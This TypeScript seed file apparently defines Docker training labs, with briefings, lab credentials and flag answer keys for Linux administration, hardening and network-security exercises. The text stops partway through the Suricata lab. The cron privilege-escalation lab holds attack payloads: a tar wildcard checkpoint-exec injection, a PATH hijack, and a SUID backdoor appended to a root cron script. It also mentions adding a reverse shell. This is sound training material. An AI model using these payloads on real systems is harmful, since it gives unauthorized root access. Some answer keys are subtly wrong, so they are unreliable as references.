import { PrismaClient } from '@prisma/client';
import { hashAnswer, encryptCredentials, createLabWithFlags } from './seed-enrich-helpers';

interface LabEntry {
  title: string;
  description: string;
  dockerImage: string;
  difficulty: number;
  estimatedMinutes: number;
  briefing: string;
  tasks: string[];
  credentials: Array<{ service: string; username: string; password: string }>;
  flags: Array<{ title: string; description: string; correctAnswer: string; points: number }>;
}

const labs: LabEntry[] = [
{
    title: "Linux Fundamentals: Ubuntu CLI Mastery",
    description: "Master essential Ubuntu command-line operations including navigation, file manipulation, and system information commands.",
    dockerImage: "ubuntu:22.04",
    difficulty: 800,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Gain fluency in the Ubuntu command-line interface by completing real-world navigation and file management tasks.

### Environment
- Ubuntu 22.04 LTS base image
- Standard GNU coreutils installed
- Credentials: root / ubuntu-cli-2024!

### Tasks
1. Navigate to /etc and list all files beginning with net
2. Create the directory structure /opt/labs/{web,db,logs} in a single command
3. Use find to locate all .conf files under /etc with their sizes
4. Use grep to search /var/log/syslog for the word error (create sample entries first)
5. Redirect the output of uname -a to /tmp/uname.txt and verify its contents
6. Use wc to count lines, words, and characters in /etc/passwd
7. Create a symbolic link from /tmp/mylink pointing to /etc/hostname
8. Use man to find the option for color output in the ls command

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Navigate to /etc and list all files beginning with net", "Create the directory structure /opt/labs/{web,db,logs} in a single command", "Use find to locate all .conf files under /etc with their sizes", "Use grep to search /var/log/syslog for the word error (create sample entries first)", "Redirect the output of uname -a to /tmp/uname.txt and verify its contents", "Use wc to count lines, words, and characters in /etc/passwd", "Create a symbolic link from /tmp/mylink pointing to /etc/hostname", "Use man to find the option for color output in the ls command"],
    credentials: [
      { service: "container", username: "root", password: "ubuntu-cli-2024!" }
    ],
    flags: [
      { title: "Directory Navigator", description: "Correctly list net* files in /etc", correctAnswer: "ls /etc/net*", points: 100 },
      { title: "Tree Builder", description: "Create /opt/labs/{web,db,logs} structure", correctAnswer: "mkdir -p /opt/labs/{web,db,logs}", points: 150 },
      { title: "File Finder", description: "Use find to locate .conf files with sizes", correctAnswer: "find /etc -name '*.conf' -exec ls -lh {} \\;", points: 150 },
      { title: "Log Detective", description: "Search syslog for error entries", correctAnswer: "grep error /var/log/syslog", points: 100 },
      { title: "Link Creator", description: "Create symlink from /tmp/mylink to /etc/hostname", correctAnswer: "ln -s /etc/hostname /tmp/mylink", points: 200 }
    ],
  },
  {
    title: "Linux Fundamentals: File Permissions & Users",
    description: "Understand and manipulate Linux file permissions, ownership, and user/group management.",
    dockerImage: "ubuntu:22.04",
    difficulty: 900,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Master the Linux permission model by configuring access control for files and directories in realistic scenarios.

### Environment
- Ubuntu 22.04 LTS
- User management tools (adduser, usermod, groupadd)
- Credentials: root / perms-lab-2024!

### Tasks
1. Create users alice and bob with home directories
2. Create a group called developers and add both users to it
3. Create /opt/project with permissions 770 owned by root:developers
4. Use chmod to set SUID on /opt/project/run.sh and verify with ls -la
5. Set a umask of 027 and verify new files are created with correct default permissions
6. Configure ACL on /opt/project/shared so user bob has rwx access
7. Audit all files in /etc owned by root with permissions more permissive than 644
8. Demonstrate the difference between chmod 777 and chmod 1777 using /tmp as an example

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Create users alice and bob with home directories", "Create a group called developers and add both users to it", "Create /opt/project with permissions 770 owned by root:developers", "Use chmod to set SUID on /opt/project/run.sh and verify with ls -la", "Set a umask of 027 and verify new files are created with correct default permissions", "Configure ACL on /opt/project/shared so user bob has rwx access", "Audit all files in /etc owned by root with permissions more permissive than 644", "Demonstrate the difference between chmod 777 and chmod 1777 using /tmp as an example"],
    credentials: [
      { service: "container", username: "root", password: "perms-lab-2024!" }
    ],
    flags: [
      { title: "User Architect", description: "Create alice and bob users correctly", correctAnswer: "adduser alice && adduser bob", points: 100 },
      { title: "Group Master", description: "Create developers group with both users", correctAnswer: "groupadd developers && usermod -aG developers alice && usermod -aG developers bob", points: 150 },
      { title: "SUID Setter", description: "Set SUID bit on run.sh", correctAnswer: "chmod u+s /opt/project/run.sh", points: 200 },
      { title: "ACL Pro", description: "Set ACL for bob on shared directory", correctAnswer: "setfacl -m u:bob:rwx /opt/project/shared", points: 200 },
      { title: "Umask Expert", description: "Set umask to 027", correctAnswer: "umask 027", points: 100 }
    ],
  },
  {
    title: "Linux Fundamentals: Text Processing & Shell Scripting",
    description: "Learn powerful text processing tools and write effective shell scripts for automation.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1000,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Become proficient with sed, awk, cut, sort, and write bash scripts that automate real administrative tasks.

### Environment
- Ubuntu 22.04 LTS
- Bash 5.1+, coreutils, gawk, sed
- Credentials: root / text-script-2024!

### Tasks
1. Use awk to extract the 1st and 3rd fields from /etc/passwd delimited by :
2. Use sed to replace all occurrences of localhost with 127.0.0.1 in /etc/hosts
3. Use sort and uniq -c to count unique users in /var/log/auth.log
4. Write a bash script that backs up all .log files in /var/log to /backup with timestamps
5. Use grep -r to find all files under /etc containing the string password
6. Write a script that accepts a directory as argument and reports total size of each file type
7. Use cut to extract all usernames from /etc/passwd and save to /tmp/userlist.txt
8. Write a while loop that reads /etc/passwd line by line and prints UID and username

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Use awk to extract the 1st and 3rd fields from /etc/passwd delimited by :", "Use sed to replace all occurrences of localhost with 127.0.0.1 in /etc/hosts", "Use sort and uniq -c to count unique users in /var/log/auth.log", "Write a bash script that backs up all .log files in /var/log to /backup with timestamps", "Use grep -r to find all files under /etc containing the string password", "Write a script that accepts a directory as argument and reports total size of each file type", "Use cut to extract all usernames from /etc/passwd and save to /tmp/userlist.txt", "Write a while loop that reads /etc/passwd line by line and prints UID and username"],
    credentials: [
      { service: "container", username: "root", password: "text-script-2024!" }
    ],
    flags: [
      { title: "Awk Wizard", description: "Extract fields 1 and 3 from /etc/passwd with awk", correctAnswer: "awk -F: '{print $1,$3}' /etc/passwd", points: 150 },
      { title: "Sed Substitutor", description: "Replace localhost with 127.0.0.1 using sed", correctAnswer: "sed -i 's/localhost/127.0.0.1/g' /etc/hosts", points: 150 },
      { title: "Log Counter", description: "Count unique users in auth.log", correctAnswer: "sort /var/log/auth.log | uniq -c", points: 150 },
      { title: "Script Author", description: "Write backup script for log files", correctAnswer: "bash /opt/scripts/backup-logs.sh", points: 200 },
      { title: "Pipeline Pro", description: "Extract usernames with cut", correctAnswer: "cut -d: -f1 /etc/passwd > /tmp/userlist.txt", points: 100 }
    ],
  },
  {
    title: "Linux Fundamentals: Process & Service Management",
    description: "Master process inspection, signal handling, background jobs, and systemd service management.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1100,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Learn to inspect, control, and debug Linux processes and services using modern tools.

### Environment
- Ubuntu 22.04 LTS
- systemd, procps, htop
- Credentials: root / proc-svc-2024!

### Tasks
1. Use ps aux to list all running processes and identify the top memory consumer
2. Start a background process and use jobs/fg/bg to manage it
3. Use kill to send SIGTERM then SIGKILL to a process and observe the difference
4. Use top to sort processes by CPU usage and take a snapshot
5. Find all zombie processes using ps and explain how to clean them up
6. Use systemctl to list all running services and identify any failed units
7. Create a custom systemd service for a simple shell script
8. Use journalctl to inspect logs for the sshd service

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Use ps aux to list all running processes and identify the top memory consumer", "Start a background process and use jobs/fg/bg to manage it", "Use kill to send SIGTERM then SIGKILL to a process and observe the difference", "Use top to sort processes by CPU usage and take a snapshot", "Find all zombie processes using ps and explain how to clean them up", "Use systemctl to list all running services and identify any failed units", "Create a custom systemd service for a simple shell script", "Use journalctl to inspect logs for the sshd service"],
    credentials: [
      { service: "container", username: "root", password: "proc-svc-2024!" }
    ],
    flags: [
      { title: "Process Inspector", description: "Identify top memory consumer process", correctAnswer: "ps aux --sort=-%mem | head -1", points: 100 },
      { title: "Signal Handler", description: "Demonstrate SIGTERM vs SIGKILL", correctAnswer: "kill -15 <pid> && kill -9 <pid>", points: 150 },
      { title: "Service Manager", description: "List failed systemd units", correctAnswer: "systemctl list-units --state=failed", points: 150 },
      { title: "Service Creator", description: "Create a custom systemd service unit", correctAnswer: "systemctl enable my-custom-service", points: 200 },
      { title: "Log Reader", description: "Inspect sshd logs with journalctl", correctAnswer: "journalctl -u sshd --no-pager", points: 100 }
    ],
  },
  {
    title: "Systemd Service Hardening",
    description: "Harden systemd services using sandboxing, capability restrictions, and security directives.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1200,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Apply enterprise-grade hardening to systemd services to minimize attack surface and enforce least privilege.

### Environment
- Ubuntu 22.04 LTS with systemd 249+
- Custom service unit files
- Credentials: root / harden-sys-2024!

### Tasks
1. Create a vulnerable service unit and identify all security weaknesses
2. Add ProtectSystem=strict and ProtectHome=yes to the service unit
3. Configure NoNewPrivileges=yes and restrict syscall groups with SystemCallFilter
4. Set up PrivateTmp=yes and PrivateDevices=yes for filesystem isolation
5. Use CapabilityBoundingSet to drop all capabilities except NET_BIND_SERVICE
6. Configure sandboxing with RestrictNamespaces=yes and RestrictSUIDSGID=yes
7. Apply ResourceLimit directives to cap CPU and memory usage
8. Verify hardening by attempting to perform restricted actions

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Create a vulnerable service unit and identify all security weaknesses", "Add ProtectSystem=strict and ProtectHome=yes to the service unit", "Configure NoNewPrivileges=yes and restrict syscall groups with SystemCallFilter", "Set up PrivateTmp=yes and PrivateDevices=yes for filesystem isolation", "Use CapabilityBoundingSet to drop all capabilities except NET_BIND_SERVICE", "Configure sandboxing with RestrictNamespaces=yes and RestrictSUIDSGID=yes", "Apply ResourceLimit directives to cap CPU and memory usage", "Verify hardening by attempting to perform restricted actions"],
    credentials: [
      { service: "container", username: "root", password: "harden-sys-2024!" }
    ],
    flags: [
      { title: "Harden Starter", description: "Add ProtectSystem=strict to service", correctAnswer: "ProtectSystem=strict", points: 150 },
      { title: "Capability Dropper", description: "Set correct CapabilityBoundingSet", correctAnswer: "CapabilityBoundingSet=CAP_NET_BIND_SERVICE", points: 200 },
      { title: "Namespace Guard", description: "Enable RestrictNamespaces", correctAnswer: "RestrictNamespaces=yes", points: 200 },
      { title: "Filesystem Isolator", description: "Enable PrivateTmp and PrivateDevices", correctAnswer: "PrivateTmp=yes PrivateDevices=yes", points: 150 },
      { title: "Privilege Guard", description: "Set NoNewPrivileges", correctAnswer: "NoNewPrivileges=yes", points: 100 }
    ],
  },
  {
    title: "LVM & RAID Configuration Lab",
    description: "Configure Logical Volume Management and software RAID arrays for resilient storage.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1300,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Build and manage logical volumes and software RAID devices to create resilient, expandable storage systems.

### Environment
- Ubuntu 22.04 LTS
- lvm2, mdadm packages
- Credentials: root / lvm-raid-2024!

### Tasks
1. Create three 1GB loopback devices to simulate disks
2. Set up RAID 1 (mirror) using mdadm with two of the loop devices
3. Initialize the third loop device as a physical volume for LVM
4. Create a volume group and logical volume on the RAID device
5. Extend the logical volume by adding the LVM physical volume
6. Create an ext4 filesystem on the logical volume and mount it
7. Test RAID degradation by marking one disk as failed and rebuild
8. Back up the LVM metadata and recreate the volume group from backup

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Create three 1GB loopback devices to simulate disks", "Set up RAID 1 (mirror) using mdadm with two of the loop devices", "Initialize the third loop device as a physical volume for LVM", "Create a volume group and logical volume on the RAID device", "Extend the logical volume by adding the LVM physical volume", "Create an ext4 filesystem on the logical volume and mount it", "Test RAID degradation by marking one disk as failed and rebuild", "Back up the LVM metadata and recreate the volume group from backup"],
    credentials: [
      { service: "container", username: "root", password: "lvm-raid-2024!" }
    ],
    flags: [
      { title: "RAID Builder", description: "Create RAID 1 array with mdadm", correctAnswer: "mdadm --create /dev/md0 --level=1 --raid-devices=2 /dev/loop0 /dev/loop1", points: 200 },
      { title: "Volume Creator", description: "Create logical volume", correctAnswer: "lvcreate -L 1G -n labvol labvg", points: 200 },
      { title: "RAID Recovery", description: "Mark disk as failed in RAID", correctAnswer: "mdadm /dev/md0 --fail /dev/loop0", points: 200 },
      { title: "LVM Extender", description: "Extend logical volume", correctAnswer: "lvextend -L +1G /dev/labvg/labvol", points: 150 },
      { title: "Metadata Saver", description: "Export LVM metadata", correctAnswer: "vgcfgbackup labvg", points: 100 }
    ],
  },
  {
    title: "NFS & Samba File Sharing",
    description: "Configure NFS exports and Samba shares for cross-platform file sharing with access controls.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1400,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Set up NFS and Samba file sharing servers with proper authentication, permissions, and access controls.

### Environment
- Ubuntu 22.04 LTS
- nfs-kernel-server, samba packages
- Credentials: root / share-lab-2024!

### Tasks
1. Install and configure the NFS kernel server
2. Create an NFS export directory with restricted client access
3. Configure /etc/exports with rw, sync, and root_squash options
4. Install and configure Samba server with security = user
5. Create a Samba user and set up a private share
6. Configure SMB share access using valid users and write list
7. Use showmount to verify NFS exports from the client perspective
8. Test file permissions across both NFS and Samba shares simultaneously

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Install and configure the NFS kernel server", "Create an NFS export directory with restricted client access", "Configure /etc/exports with rw, sync, and root_squash options", "Install and configure Samba server with security = user", "Create a Samba user and set up a private share", "Configure SMB share access using valid users and write list", "Use showmount to verify NFS exports from the client perspective", "Test file permissions across both NFS and Samba shares simultaneously"],
    credentials: [
      { service: "container", username: "root", password: "share-lab-2024!" }
    ],
    flags: [
      { title: "NFS Exporter", description: "Configure NFS export with correct options", correctAnswer: "/export/shared 192.168.0.0/24(rw,sync,no_subtree_check)", points: 200 },
      { title: "Samba Builder", description: "Configure Samba share with user auth", correctAnswer: "security = user", points: 200 },
      { title: "Access Controller", description: "Set valid users for Samba share", correctAnswer: "valid users = @sambagroup", points: 200 },
      { title: "Squash Manager", description: "Configure root_squash in NFS", correctAnswer: "root_squash", points: 150 },
      { title: "Share Tester", description: "Verify exports are visible", correctAnswer: "showmount -e localhost", points: 100 }
    ],
  },
  {
    title: "Cron Exploitation & Privilege Escalation",
    description: "Identify and exploit misconfigured cron jobs to escalate privileges on a Linux system.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1500,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Discover and exploit cron job misconfigurations to escalate from a low-privileged user to root.

### Environment
- Ubuntu 22.04 LTS
- cron, crontab, at
- Credentials: user / cron-esc-2024! / root / cron-root-2024!

### Tasks
1. Enumerate all cron jobs across all users and system crontabs
2. Identify cron jobs running as root that execute world-writable scripts
3. Find cron jobs using wildcard characters that can be exploited via argument injection
4. Modify a cron script to add a reverse shell or SUID backdoor
5. Exploit PATH manipulation by placing a malicious binary in a cron-processed PATH
6. Use crontab -l as a regular user and identify writable cron scripts
7. Escalate to root by exploiting a cron job that runs tar with wildcards
8. Document the full attack chain from enumeration to privilege escalation

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Enumerate all cron jobs across all users and system crontabs", "Identify cron jobs running as root that execute world-writable scripts", "Find cron jobs using wildcard characters that can be exploited via argument injection", "Modify a cron script to add a reverse shell or SUID backdoor", "Exploit PATH manipulation by placing a malicious binary in a cron-processed PATH", "Use crontab -l as a regular user and identify writable cron scripts", "Escalate to root by exploiting a cron job that runs tar with wildcards", "Document the full attack chain from enumeration to privilege escalation"],
    credentials: [
      { service: "ssh", username: "user", password: "cron-esc-2024!" },
      { service: "ssh", username: "root", password: "cron-root-2024!" }
    ],
    flags: [
      { title: "Cron Enumerator", description: "List all system and user cron jobs", correctAnswer: "for user in $(cut -d: -f1 /etc/passwd); do crontab -u $user -l 2>/dev/null; done", points: 150 },
      { title: "Wildcard Exploiter", description: "Exploit tar wildcard in cron", correctAnswer: "--checkpoint=1 --checkpoint-action=exec=sh root.sh", points: 300 },
      { title: "PATH Hijacker", description: "Exploit PATH manipulation in cron", correctAnswer: "echo /bin/bash > /tmp/abusable && chmod +x /tmp/abusable", points: 200 },
      { title: "Script Inflater", description: "Modify writable cron script", correctAnswer: "echo 'chmod +s /bin/bash' >> /opt/cron-backup.sh", points: 300 },
      { title: "Root Captured", description: "Verify root shell access obtained", correctAnswer: "id | grep -q root", points: 150 }
    ],
  },
  {
    title: "Firewall Configuration with iptables",
    description: "Configure iptables firewall rules to protect a Linux system from network threats.",
    dockerImage: "ubuntu:22.04",
    difficulty: 800,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Build a layered firewall using iptables to filter inbound, outbound, and forwarded traffic.

### Environment
- Ubuntu 22.04 LTS with iptables
- Multiple network interfaces simulated
- Credentials: root / iptables-2024!

### Tasks
1. List all current iptables rules and chains
2. Create a default DROP policy for INPUT chain
3. Allow only SSH (port 22) and HTTP (port 80) inbound
4. Block a specific IP address range using a custom chain
5. Log dropped packets with a custom prefix for analysis
6. Rate-limit SSH connections to prevent brute-force attacks
7. Configure NAT/MASQUERADE for outbound traffic
8. Save and restore iptables rules across reboots

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["List all current iptables rules and chains", "Create a default DROP policy for INPUT chain", "Allow only SSH (port 22) and HTTP (port 80) inbound", "Block a specific IP address range using a custom chain", "Log dropped packets with a custom prefix for analysis", "Rate-limit SSH connections to prevent brute-force attacks", "Configure NAT/MASQUERADE for outbound traffic", "Save and restore iptables rules across reboots"],
    credentials: [
      { service: "container", username: "root", password: "iptables-2024!" }
    ],
    flags: [
      { title: "Policy Setter", description: "Set default DROP policy on INPUT", correctAnswer: "iptables -P INPUT DROP", points: 150 },
      { title: "Port Opener", description: "Allow ports 22 and 80", correctAnswer: "iptables -A INPUT -p tcp --dport 22 -j ACCEPT && iptables -A INPUT -p tcp --dport 80 -j ACCEPT", points: 150 },
      { title: "IP Blocker", description: "Block IP range in custom chain", correctAnswer: "iptables -N BLOCK_RANGE && iptables -A BLOCK_RANGE -s 10.0.0.0/8 -j DROP", points: 200 },
      { title: "Log Dropper", description: "Log dropped packets with prefix", correctAnswer: "iptables -A INPUT -j LOG --log-prefix 'DROPPED: '", points: 200 },
      { title: "Rate Limiter", description: "Rate-limit SSH connections", correctAnswer: "iptables -A INPUT -p tcp --dport 22 -m connlimit --connlimit-above 3 -j DROP", points: 200 }
    ],
  },
  {
    title: "Network Reconnaissance with Nmap",
    description: "Use Nmap for comprehensive network discovery and security auditing.",
    dockerImage: "parrotsec/security",
    difficulty: 850,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Master Nmap scanning techniques to discover hosts, services, and vulnerabilities on a target network.

### Environment
- Parrot Security OS with Nmap
- Multiple target services running
- Credentials: root / nmap-lab-2024!

### Tasks
1. Perform a ping sweep to discover live hosts on the subnet
2. Run a TCP SYN scan (-sS) against the top 1000 ports
3. Perform a service version detection scan (-sV) on discovered ports
4. Run an OS detection scan (-O) against target hosts
5. Use Nmap Scripting Engine (NSE) to detect known vulnerabilities
6. Perform a UDP scan on common UDP ports
7. Create a comprehensive scan report in XML and normal formats
8. Use timing templates (T0-T5) and explain when each is appropriate

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform a ping sweep to discover live hosts on the subnet", "Run a TCP SYN scan (-sS) against the top 1000 ports", "Perform a service version detection scan (-sV) on discovered ports", "Run an OS detection scan (-O) against target hosts", "Use Nmap Scripting Engine (NSE) to detect known vulnerabilities", "Perform a UDP scan on common UDP ports", "Create a comprehensive scan report in XML and normal formats", "Use timing templates (T0-T5) and explain when each is appropriate"],
    credentials: [
      { service: "container", username: "root", password: "nmap-lab-2024!" }
    ],
    flags: [
      { title: "Host Finder", description: "Discover live hosts with ping sweep", correctAnswer: "nmap -sn 192.168.1.0/24", points: 100 },
      { title: "Port Scanner", description: "Run TCP SYN scan", correctAnswer: "nmap -sS 192.168.1.0/24", points: 150 },
      { title: "Version Detective", description: "Detect service versions", correctAnswer: "nmap -sV -p- 192.168.1.10", points: 200 },
      { title: "OS Identifier", description: "Detect operating system", correctAnswer: "nmap -O 192.168.1.10", points: 150 },
      { title: "Script Runner", description: "Run NSE vulnerability scripts", correctAnswer: "nmap --script vuln 192.168.1.10", points: 200 }
    ],
  },
  {
    title: "DNS Security & Cache Poisoning Defense",
    description: "Understand DNS architecture, implement DNSSEC, and defend against cache poisoning attacks.",
    dockerImage: "ubuntu:22.04",
    difficulty: 950,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Deploy and harden a DNS server, implement DNSSEC, and mitigate DNS-based attacks.

### Environment
- Ubuntu 22.04 LTS
- BIND9 DNS server
- Credentials: root / dns-sec-2024!

### Tasks
1. Install and configure BIND9 as a recursive DNS server
2. Create forward and reverse zone files for a local domain
3. Enable DNSSEC signing for the local zone
4. Configure response rate limiting (RRL) to prevent amplification
5. Implement DNS over TLS (DoT) for encrypted DNS queries
6. Analyze DNS cache poisoning attack vectors and configure mitigations
7. Use dig and nslookup to verify DNSSEC chain of trust
8. Monitor DNS queries and responses with query logging

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Install and configure BIND9 as a recursive DNS server", "Create forward and reverse zone files for a local domain", "Enable DNSSEC signing for the local zone", "Configure response rate limiting (RRL) to prevent amplification", "Implement DNS over TLS (DoT) for encrypted DNS queries", "Analyze DNS cache poisoning attack vectors and configure mitigations", "Use dig and nslookup to verify DNSSEC chain of trust", "Monitor DNS queries and responses with query logging"],
    credentials: [
      { service: "container", username: "root", password: "dns-sec-2024!" }
    ],
    flags: [
      { title: "DNS Installer", description: "Install and start BIND9", correctAnswer: "apt-get install -y bind9 && systemctl start named", points: 100 },
      { title: "Zone Crafter", description: "Create forward zone file", correctAnswer: "named.conf.local zone declaration", points: 200 },
      { title: "DNSSEC Enabler", description: "Enable DNSSEC signing", correctAnswer: "dnssec-signzone -A -3 $(head -c 1000 /dev/urandom | sha1sum | cut -b 1-16) -N INCREMENT -o lab.local -t lab.local.signed", points: 250 },
      { title: "RRL Configurator", description: "Configure response rate limiting", correctAnswer: "rate-limit { responses-per-second 10; };", points: 200 },
      { title: "DNS Logger", description: "Enable query logging", correctAnswer: "logging { channel query_log { file '/var/log/queries.log'; severity info; }; category queries query_log; };", points: 150 }
    ],
  },
  {
    title: "TLS/SSL Certificate Management",
    description: "Deploy, configure, and troubleshoot TLS/SSL certificates for secure communications.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1000,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Generate self-signed certificates, configure HTTPS, and implement certificate lifecycle management.

### Environment
- Ubuntu 22.04 LTS
- OpenSSL, nginx
- Credentials: root / tls-mgmt-2024!

### Tasks
1. Generate a self-signed CA certificate and key pair
2. Create a server certificate signed by the CA
3. Configure nginx to use the certificates for HTTPS
4. Verify certificate chain with openssl s_client
5. Implement OCSP stapling on nginx
6. Set up certificate auto-renewal with certbot
7. Analyze certificate details with openssl x509
8. Configure HSTS and other HTTP security headers

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Generate a self-signed CA certificate and key pair", "Create a server certificate signed by the CA", "Configure nginx to use the certificates for HTTPS", "Verify certificate chain with openssl s_client", "Implement OCSP stapling on nginx", "Set up certificate auto-renewal with certbot", "Analyze certificate details with openssl x509", "Configure HSTS and other HTTP security headers"],
    credentials: [
      { service: "container", username: "root", password: "tls-mgmt-2024!" }
    ],
    flags: [
      { title: "CA Creator", description: "Generate CA certificate", correctAnswer: "openssl req -x509 -newkey rsa:4096 -keyout ca.key -out ca.crt -days 365 -nodes", points: 200 },
      { title: "Server Cert", description: "Create server certificate", correctAnswer: "openssl req -new -newkey rsa:2048 -keyout server.key -out server.csr", points: 200 },
      { title: "HTTPS Config", description: "Configure nginx for HTTPS", correctAnswer: "ssl_certificate /etc/ssl/server.crt; ssl_certificate_key /etc/ssl/server.key;", points: 200 },
      { title: "OCSP Stapler", description: "Enable OCSP stapling", correctAnswer: "ssl_stapling on; ssl_stapling_verify on;", points: 200 },
      { title: "HSTS Header", description: "Set HSTS header", correctAnswer: "add_header Strict-Transport-Security max-age=31536000; includeSubDomains always;", points: 150 }
    ],
  },
  {
    title: "VPN Configuration with WireGuard",
    description: "Deploy and configure WireGuard VPN for secure site-to-site and remote access connections.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1050,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Set up WireGuard VPN tunnels with proper key management, routing, and firewall rules.

### Environment
- Ubuntu 22.04 LTS
- WireGuard kernel module
- Credentials: root / vpn-wg-2024!

### Tasks
1. Generate WireGuard key pairs (private, public, preshared)
2. Configure a WireGuard server interface (wg0)
3. Set up IP forwarding and NAT for VPN traffic
4. Configure a client peer with proper allowed IPs
5. Implement kill switch to prevent traffic leaks
6. Set up DNS over the VPN tunnel
7. Monitor WireGuard connections and transfer statistics
8. Test the VPN tunnel with ping and traceroute

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Generate WireGuard key pairs (private, public, preshared)", "Configure a WireGuard server interface (wg0)", "Set up IP forwarding and NAT for VPN traffic", "Configure a client peer with proper allowed IPs", "Implement kill switch to prevent traffic leaks", "Set up DNS over the VPN tunnel", "Monitor WireGuard connections and transfer statistics", "Test the VPN tunnel with ping and traceroute"],
    credentials: [
      { service: "container", username: "root", password: "vpn-wg-2024!" }
    ],
    flags: [
      { title: "Key Generator", description: "Generate WireGuard key pair", correctAnswer: "wg genkey | tee privatekey | wg pubkey > publickey", points: 150 },
      { title: "Interface Config", description: "Configure wg0 interface", correctAnswer: "ip link add wg0 type wireguard && ip addr add 10.0.0.1/24 dev wg0", points: 200 },
      { title: "IP Forwarder", description: "Enable IP forwarding", correctAnswer: "sysctl -w net.ipv4.ip_forward=1", points: 100 },
      { title: "NAT Rule", description: "Configure NAT for VPN", correctAnswer: "iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE", points: 200 },
      { title: "Tunnel Tester", description: "Verify tunnel connectivity", correctAnswer: "ping -c 3 10.0.0.2", points: 150 }
    ],
  },
  {
    title: "Intrusion Detection with Suricata",
    description: "Deploy Suricata IDS/IPS and create custom detection rules for network monitoring.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1100,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Install and configure Suricata for network intrusion detection with custom rules and eve.json logging.

### Environment
- Ubuntu 22.04 LTS
- Suricata IDS/IPS
- Credentials: root / ids-sur-2024!

### Tasks
1. Install Suricata and update the ET Open ruleset
2. Configure Suricata in IDS mode on a network interface
3. Create custom rules to detect SSH brute-force attempts
4. Write rules to detect HTTP SQL injection patterns
5. Configure eve.json for structured JSON logging
6. Set up Suricata in IPS mode with NFQUEUE
7. Tune rules to reduce false positives
8. Analyze Suricata alerts using suricatasc and eve.json

### Permissions & Access
- Container runs as root \u2014 maintain least privilege
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Install Suricata and update the ET Open ruleset", "Configure Suricata in IDS mode on a network interface", "Create custom rules to detect SSH brute-force attempts", "Write rules to detect HTTP SQL injection patterns", "Configure eve.json for structured JSON logging", "Set up Suricata in IPS mode with NFQUEUE", "Tune rules to reduce false positives", "Analyze Suricata alerts using suricatasc and eve.json"],
    credentials: [
      { service: "container", username: "root", password: "ids-sur-2024!" }
    ],
    flags: [
      { title: "IDS Installer", description: "Install and update Suricata", correctAnswer: "apt-get install -y suricata && suricata-update", points: 100 },
      { title: "SSH Rule", description: "Create SSH brute-force rule", correctAnswer: "alert ssh any any -> $HOME_NET 22 (msg:'SSH Brute Force'; flow:to_server; threshold: type both, track by_src, count 5, seconds 60; sid:1000001; rev:1;)", points: 200 },
